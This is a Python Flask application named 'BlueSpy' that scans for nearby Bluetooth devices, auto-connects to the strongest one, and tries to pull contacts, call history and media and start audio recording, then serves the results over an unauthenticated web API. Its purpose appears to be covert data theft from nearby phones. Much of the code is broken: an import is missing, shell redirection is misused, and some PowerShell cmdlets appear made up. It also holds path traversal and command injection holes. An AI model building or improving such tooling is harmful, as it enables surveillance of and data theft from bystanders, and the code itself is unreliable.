from flask import Flask, render_template, jsonify, send_file, request, send_from_directory, Response
import os
import json
import subprocess
import threading
import time
import platform
import re
import shutil
from pathlib import Path
try:
    import winreg  # For Windows registry access
except ImportError:
    winreg = None

app = Flask(__name__)

# Directory to store recordings
RECORDINGS_DIR = "recordings"
if not os.path.exists(RECORDINGS_DIR):
    os.makedirs(RECORDINGS_DIR)

# Global variables for scanning
is_scanning = False
scan_thread = None

# Check if running on Windows
IS_WINDOWS = platform.system() == 'Windows'

DEVICES_FILE = 'devices.json'
EXTRACTED_DATA_DIR = 'extracted_data'

# Create necessary directories
for directory in [RECORDINGS_DIR, EXTRACTED_DATA_DIR]:
    if not os.path.exists(directory):
        os.makedirs(directory)

def get_windows_bluetooth_devices():
    """Get detailed Bluetooth device information on Windows"""
    try:
        # Query Windows registry for Bluetooth devices
        devices = []
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\BTHPORT\Parameters\Devices") as key:
            i = 0
            while True:
                try:
                    device_key = winreg.EnumKey(key, i)
                    with winreg.OpenKey(key, device_key) as device:
                        name = winreg.QueryValueEx(device, "Name")[0]
                        address = device_key.replace("&", ":")
                        devices.append({
                            'name': name,
                            'address': address,
                            'type': 'Unknown',
                            'status': 'disconnected',
                            'info': f"Device: {name} ({address})"
                        })
                    i += 1
                except WindowsError:
                    break
        return devices
    except Exception as e:
        print(f"Error getting Windows Bluetooth devices: {e}")
        return []

def get_linux_bluetooth_devices():
    """Get detailed Bluetooth device information on Linux/Termux"""
    try:
        # Start scanning
        subprocess.run(['bluetoothctl', 'scan', 'on'], capture_output=True)
        time.sleep(5)  # Scan for 5 seconds
        
        # Get devices
        result = subprocess.run(['bluetoothctl', 'devices'], capture_output=True, text=True)
        devices = []
        
        for line in result.stdout.split('\n'):
            if 'Device' in line:
                parts = line.strip().split()
                if len(parts) >= 3:
                    address = parts[1]
                    name = ' '.join(parts[2:])
                    
                    # Get device info
                    info = subprocess.run(['bluetoothctl', 'info', address], capture_output=True, text=True)
                    rssi = re.search(r'RSSI: (-?\d+)', info.stdout)
                    rssi_value = int(rssi.group(1)) if rssi else 0
                    
                    devices.append({
                        'name': name,
                        'address': address,
                        'type': 'Unknown',
                        'status': 'disconnected',
                        'info': info.stdout,
                        'rssi': rssi_value
                    })
        
        # Stop scanning
        subprocess.run(['bluetoothctl', 'scan', 'off'])
        return devices
    except Exception as e:
        print(f"Error getting Linux Bluetooth devices: {e}")
        return []

def extract_device_data(device_address):
    """Extract data from connected device"""
    try:
        device_dir = os.path.join(EXTRACTED_DATA_DIR, device_address)
        if not os.path.exists(device_dir):
            os.makedirs(device_dir)

        # Create subdirectories for different types of data
        for subdir in ['contacts', 'call_history', 'media', 'recordings']:
            os.makedirs(os.path.join(device_dir, subdir), exist_ok=True)

        if IS_WINDOWS:
            # Windows-specific data extraction
            # Extract contacts using PowerShell
            contacts_cmd = '''
            $contacts = Get-Contact
            $contacts | Export-Csv -Path "{0}" -NoTypeInformation
            '''.format(os.path.join(device_dir, "contacts", "contacts.csv"))
            subprocess.run(['powershell', '-Command', contacts_cmd], capture_output=True)
            
            # Extract call history
            calls_cmd = '''
            $calls = Get-CallHistory
            $calls | Export-Csv -Path "{0}" -NoTypeInformation
            '''.format(os.path.join(device_dir, "call_history", "calls.csv"))
            subprocess.run(['powershell', '-Command', calls_cmd], capture_output=True)
            
            # Extract media files
            media_cmd = '''
            $media = Get-ChildItem -Path "C:\\Users\\$env:USERNAME\\Pictures" -Recurse -Include *.jpg,*.jpeg,*.png,*.mp4,*.mov
            foreach ($file in $media) {{
                Copy-Item $file.FullName -Destination "{0}"
            }}
            '''.format(os.path.join(device_dir, "media"))
            subprocess.run(['powershell', '-Command', media_cmd], capture_output=True)
        else:
            # Linux/Termux data extraction using adb
            # Extract contacts
            subprocess.run(['adb', 'shell', 'content', 'query', '--uri', 'content://contacts/phones', '>', 
                          os.path.join(device_dir, 'contacts', 'contacts.txt')])
            
            # Extract call history
            subprocess.run(['adb', 'shell', 'content', 'query', '--uri', 'content://call_log/calls', '>', 
                          os.path.join(device_dir, 'call_history', 'calls.txt')])
            
            # Extract media files
            subprocess.run(['adb', 'pull', '/sdcard/DCIM', os.path.join(device_dir, 'media')])

        return True
    except Exception as e:
        print(f"Error extracting data: {e}")
        return False

def start_live_recording(device_address):
    """Start live recording from device"""
    try:
        recording_dir = os.path.join(EXTRACTED_DATA_DIR, device_address, 'recordings')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        recording_file = os.path.join(recording_dir, f'live_recording_{timestamp}.wav')

        if IS_WINDOWS:
            # Windows recording using PowerShell
            recording_cmd = f'''
            $recorder = New-Object -ComObject WScript.Shell
            $recorder.SendKeys("^%r")  # Start recording
            Start-Sleep -Seconds 1
            '''
            subprocess.Popen(['powershell', '-Command', recording_cmd])
        else:
            # Linux/Termux recording using arecord
            subprocess.Popen(['arecord', '-f', 'cd', '-d', '0', recording_file])

        return recording_file
    except Exception as e:
        print(f"Error starting recording: {e}")
        return None

def stop_live_recording(recording_file):
    """Stop live recording"""
    try:
        if IS_WINDOWS:
            subprocess.run(['powershell', '-Command', 'Stop-Process -Name "SoundRecorder" -Force'])
        else:
            subprocess.run(['pkill', 'arecord'])
        return True
    except Exception as e:
        print(f"Error stopping recording: {e}")
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/recordings')
def get_recordings():
    recordings = []
    for file in os.listdir(RECORDINGS_DIR):
        if file.endswith('.wav'):
            file_path = os.path.join(RECORDINGS_DIR, file)
            recordings.append({
                'name': file,
                'size': os.path.getsize(file_path),
                'date': datetime.fromtimestamp(os.path.getctime(file_path)).strftime('%Y-%m-%d %H:%M:%S'),
                'url': f'/recordings/{file}'
            })
    return jsonify(recordings)

@app.route('/recordings/<filename>')
def get_recording(filename):
    return send_file(os.path.join(RECORDINGS_DIR, filename))

@app.route('/api/devices')
def get_devices():
    try:
        with open(DEVICES_FILE, 'r') as f:
            devices = json.load(f)
    except:
        devices = []
    return jsonify(devices)

@app.route('/api/scan', methods=['POST'])
def scan_bluetooth_devices():
    try:
        auto_connect = request.json.get('auto_connect', False)
        
        # Get devices based on platform
        if IS_WINDOWS:
            devices = get_windows_bluetooth_devices()
        else:
            devices = get_linux_bluetooth_devices()
        
        # Sort devices by signal strength (RSSI) if available
        devices.sort(key=lambda x: x.get('rssi', 0), reverse=True)
        
        # If auto-connect is enabled, connect to the strongest device
        if auto_connect and devices:
            nearest_device = devices[0]  # First device has strongest signal
            try:
                if IS_WINDOWS:
                    # Windows connection
                    connect_cmd = f'''
                    $device = Get-PnpDevice -Class Bluetooth | Where-Object {{ $_.Name -eq "{nearest_device['name']}" }}
                    if ($device) {{
                        Add-BluetoothDevice -Address "{nearest_device['address']}"
                        Connect-BluetoothDevice -Address "{nearest_device['address']}"
                    }}
                    '''
                    subprocess.run(['powershell', '-Command', connect_cmd], capture_output=True)
                else:
                    # Linux/Termux connection
                    subprocess.run(['bluetoothctl', 'pair', nearest_device['address']])
                    subprocess.run(['bluetoothctl', 'connect', nearest_device['address']])
                
                nearest_device['status'] = 'connected'
                # Extract data from connected device
                extract_device_data(nearest_device['address'])
            except Exception as e:
                print(f"Error connecting to device: {e}")
        
        return jsonify({'devices': devices})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/pair', methods=['POST'])
def pair_device():
    data = request.json
    address = data.get('address')
    if address:
        try:
            result = run_bluetooth_command(['bluetoothctl', 'pair', address])
            if result and result.returncode == 0:
                return jsonify({'status': 'success', 'message': f'Paired with {address}'})
            return jsonify({'status': 'error', 'message': 'Pairing failed'})
        except Exception as e:
            return jsonify({'status': 'error', 'message': f'Pairing error: {str(e)}'})
    return jsonify({'status': 'error', 'message': 'No address provided'})

@app.route('/api/connect', methods=['POST'])
def connect_device():
    data = request.json
    address = data.get('address')
    if address:
        try:
            result = run_bluetooth_command(['bluetoothctl', 'connect', address])
            if result and result.returncode == 0:
                return jsonify({'status': 'success', 'message': f'Connected to {address}'})
            return jsonify({'status': 'error', 'message': 'Connection failed'})
        except Exception as e:
            return jsonify({'status': 'error', 'message': f'Connection error: {str(e)}'})
    return jsonify({'status': 'error', 'message': 'No address provided'})

@app.route('/api/status')
def get_status():
    return jsonify({
        'is_scanning': is_scanning,
        'recordings_count': len([f for f in os.listdir(RECORDINGS_DIR) if f.endswith('.wav')]),
        'devices_count': len(json.load(open(DEVICES_FILE))) if os.path.exists(DEVICES_FILE) else 0,
        'platform': 'Windows' if IS_WINDOWS else 'Linux/Termux'
    })

@app.route('/api/device/<address>/data')
def get_device_data(address):
    """Get extracted data from device"""
    try:
        device_dir = os.path.join(EXTRACTED_DATA_DIR, address)
        if not os.path.exists(device_dir):
            return jsonify({'error': 'No data found for device'}), 404

        data = {
            'contacts': [],
            'call_history': [],
            'media': [],
            'recordings': []
        }

        # Get contacts
        contacts_dir = os.path.join(device_dir, 'contacts')
        if os.path.exists(contacts_dir):
            for file in os.listdir(contacts_dir):
                data['contacts'].append({
                    'name': file,
                    'path': f'/api/device/{address}/data/contacts/{file}'
                })

        # Get call history
        calls_dir = os.path.join(device_dir, 'call_history')
        if os.path.exists(calls_dir):
            for file in os.listdir(calls_dir):
                data['call_history'].append({
                    'name': file,
                    'path': f'/api/device/{address}/data/call_history/{file}'
                })

        # Get media files
        media_dir = os.path.join(device_dir, 'media')
        if os.path.exists(media_dir):
            for file in os.listdir(media_dir):
                if file.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4', '.mov')):
                    data['media'].append({
                        'name': file,
                        'path': f'/api/device/{address}/data/media/{file}'
                    })

        # Get recordings
        recordings_dir = os.path.join(device_dir, 'recordings')
        if os.path.exists(recordings_dir):
            for file in os.listdir(recordings_dir):
                if file.endswith('.wav'):
                    data['recordings'].append({
                        'name': file,
                        'path': f'/api/device/{address}/data/recordings/{file}'
                    })

        return jsonify(data)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/device/<address>/data/<data_type>/<filename>')
def get_device_file(address, data_type, filename):
    """Serve device data files"""
    try:
        file_path = os.path.join(EXTRACTED_DATA_DIR, address, data_type, filename)
        return send_file(file_path)
    except Exception as e:
        return jsonify({'error': str(e)}), 404

@app.route('/api/device/<address>/record/start', methods=['POST'])
def start_recording(address):
    """Start recording from device"""
    try:
        recording_file = start_live_recording(address)
        if recording_file:
            return jsonify({'status': 'success', 'file': recording_file})
        return jsonify({'error': 'Failed to start recording'}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/device/<address>/record/stop', methods=['POST'])
def stop_recording(address):
    """Stop recording from device"""
    try:
        if stop_live_recording(None):
            return jsonify({'status': 'success'})
        return jsonify({'error': 'Failed to stop recording'}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/device/<address>/export')
def export_device_data(address):
    device_dir = os.path.join(EXTRACTED_DATA_DIR, address)
    zip_path = f'/tmp/{address}_data.zip'
    shutil.make_archive(zip_path.replace('.zip',''), 'zip', device_dir)
    return send_file(zip_path, as_attachment=True)

def run_bluetooth_command(cmd):
    try:
        return subprocess.run(cmd, capture_output=True)
    except Exception as e:
        print(f"Bluetooth command error: {e}")
        return None

if __name__ == '__main__':
    print(f"Starting BlueSpy web interface on {'Windows' if IS_WINDOWS else 'Linux/Termux'}")
    print("Open your browser and go to: http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)